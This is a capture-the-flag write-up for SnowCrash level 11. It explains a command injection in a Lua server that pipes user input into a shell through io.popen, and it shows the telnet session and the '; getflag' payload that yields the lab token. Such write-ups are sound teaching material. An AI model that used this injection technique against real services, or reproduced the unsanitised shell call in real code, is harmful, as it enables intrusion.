## **level11:**

In this level, I found that the Lua script is a simple TCP server listening on 127.0.0.1 at port 5151. It performs password verification using a SHA-1 hash function.

```
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

Here, the user input (`pass`) is directly appended to a shell command (`echo`), making the server vulnerable to **command injection**.

Since the user input is not sanitized or escaped, adding a semicolon (`;`) in the input allows the user to terminate the current command and execute additional shell commands.

1 - Run the Telnet command to connect to the server:

```
telnet localhost 5151
```

2 - Once connected, the server will prompt for a password redirect the output to a file

```
; getflag > /tmp/flag.txt
```

Now, let's run the command to get the flag:

```
level11@SnowCrash:~$ telnet localhost 5151
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: ; getflag > /tmp/flag.txt
Erf nope..
Connection closed by foreign host.
level11@SnowCrash:~$ cat /tmp/flag.txt
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
level11@SnowCrash:~$
```

The password of the next level (level12) is : fa6v5ateaw21peobuub8ipe6s

```
level11@SnowCrash:~$ su level12
Password:fa6v5ateaw21peobuub8ipe6s
level12@SnowCrash:~$
```